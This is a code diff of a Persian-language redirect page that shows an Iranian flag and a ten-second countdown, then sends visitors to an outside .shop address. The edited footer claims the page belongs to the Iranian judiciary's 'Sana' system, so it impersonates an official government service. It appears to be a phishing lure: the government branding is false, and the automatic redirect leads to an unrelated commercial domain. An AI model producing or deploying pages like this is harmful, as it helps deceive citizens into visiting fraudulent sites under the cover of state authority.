@@ -23,20 +23,18 @@
     overflow:hidden;
   }
 
-  /* گوشهٔ پرچم بالا-چپ */
   .flag-corner{
     position:fixed;
-    top: -6%;
-    left: -8%;
+    top:-6%;
+    left:-8%;
     width:48vw;
     max-width:520px;
-    transform: rotate(-14deg);
+    transform:rotate(-14deg);
     opacity:0.98;
     pointer-events:none;
     z-index:0;
   }
 
-  /* کارت */
   .card {
     position:relative;
     z-index:2;
@@ -50,7 +48,8 @@
     animation: cardIn .9s cubic-bezier(.2,.9,.3,1);
   }
   @keyframes cardIn {
-    from{opacity:0;transform:translateY(10px) scale(.995)} to{opacity:1;transform:none}
+    from{opacity:0;transform:translateY(10px) scale(.995)} 
+    to{opacity:1;transform:none}
   }
 
   .slogan{
@@ -60,10 +59,16 @@
     margin-bottom:14px;
     direction:rtl;
   }
+
   h2{margin:6px 0 10px;font-size:20px;color:#222}
+  .count {
+    font-weight:800;
+    color:#d60000;
+    font-size:22px;
+    margin-top:10px;
+  }
   .muted{color:#444;font-size:13px;margin-top:8px;line-height:1.4;word-break:break-all}
 
-  /* دکمه */
   .btn {
     display:inline-block;
     margin-top:18px;
@@ -78,31 +83,19 @@
   .btn:active{transform:translateY(1px)}
   .btn:hover{box-shadow:0 8px 20px rgba(19,104,214,0.18)}
 
-  /* دایرهٔ شمارنده */
-  .circle{position:relative;width:110px;height:110px;margin:18px auto 6px}
-  .circle svg{transform:rotate(-90deg)}
-  .circle circle{fill:none;stroke-width:9;stroke-linecap:round}
-  .circle .bg{stroke:rgba(0,0,0,0.08)}
-  .circle .progress{stroke:var(--accent);transition:stroke-dashoffset 0.9s linear}
-  .circle .time{
-    position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
-    font-weight:800;color:#d60000;font-size:20px;
-  }
-
-  /* فوتر ریز */
   .footer{
-    margin-top:16px;font-size:12px;color:#222a; text-align:center;
+    margin-top:16px;
+    font-size:12px;
+    color:#222a; 
+    text-align:center;
   }
 
-  /* قابلت نمایش روی موبایل بهتر */
   @media (max-width:420px){
     .card{padding:22px;border-radius:12px}
-    .circle{width:92px;height:92px}
   }
 </style>
 </head>
 <body>
-  <!-- نوار/گوشه پرچم؛ تصویر از ویکی‌مدیا عمومی استفاده شده -->
   <img class="flag-corner" alt="پرچم ایران" src="https://upload.wikimedia.org/wikipedia/commons/c/ca/Flag_of_Iran.svg" />
 
   <div class="card" role="main" aria-live="polite">
@@ -110,51 +103,33 @@
 
     <h2>در حال انتقال به سایت اصلی</h2>
 
-    <div class="circle" aria-hidden="false">
-      <svg width="110" height="110" viewBox="0 0 110 110">
-        <circle class="bg" cx="55" cy="55" r="45"></circle>
-        <circle class="progress" cx="55" cy="55" r="45"></circle>
-      </svg>
-      <div class="time" id="secs">10</div>
-    </div>
+    <div class="count">انتقال در <span id="secs">10</span> ثانیه...</div>
 
     <a class="btn" href="http://adln.shop/C" rel="noopener noreferrer">هم‌اکنون برو</a>
 
     <p class="muted" style="margin-top:12px;">
-      اگر ریدایرکت خودکار کار نکرد، روی لینک زیر کلیک کنید:<br>
+      اگر انتقال خودکار انجام نشد، روی لینک زیر کلیک کنید:<br>
       <a href="http://adln.shop/C" target="_blank" rel="noopener noreferrer">http://adln.shop/C</a>
     </p>
 
-    <div class="footer">© 2025 دولت هوشمند – تمامی حقوق محفوظ و مالکیت قوه قضاییه کل جمهوری اسلامی ایران است</div>
+    <div class="footer">© 2025 دولت هوشمند – تمامی حقوق این سامانه متعلق به سامانه ثنا قوه قضاییه کل جمهوری اسلامی ایران میباشد و محفوظ است</div>
   </div>
 
 <script>
-  // مقصد ریدایرکت
   const target = "http://adln.shop/C";
-
-  // شمارشگر 10 ثانیه
   let seconds = 10;
-  const total = seconds;
-
-  // آماده‌سازی دایرهٔ SVG
-  function prepareCircle(){
-    const circle = document.querySelector('.circle .progress');
-    const radius = circle.r.baseVal.value;
-    const circumference = 2 * Math.PI * radius;
-    circle.style.strokeDasharray = `${circumference} ${circumference}`;
-    circle.style.strokeDashoffset = `${circumference}`;
-    return {circle, circumference};
-  }
-
-  const {circle, circumference} = prepareCircle();
-
-  function setProgress(remaining){
-    const offset = circumference - (remaining / total) * circumference;
-    circle.style.strokeDashoffset = offset;
-  }
 
   function tick(){
     document.getElementById('secs').textContent = seconds;
-    setProgress(seconds);
     if(seconds <= 0){
-      // جاوااسکریپت: انتقال نهایی
+      window.location.href = target;
+    } else {
+      seconds--;
+      setTimeout(tick, 1000);
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', tick);
+</script>
+</body>
+</html>
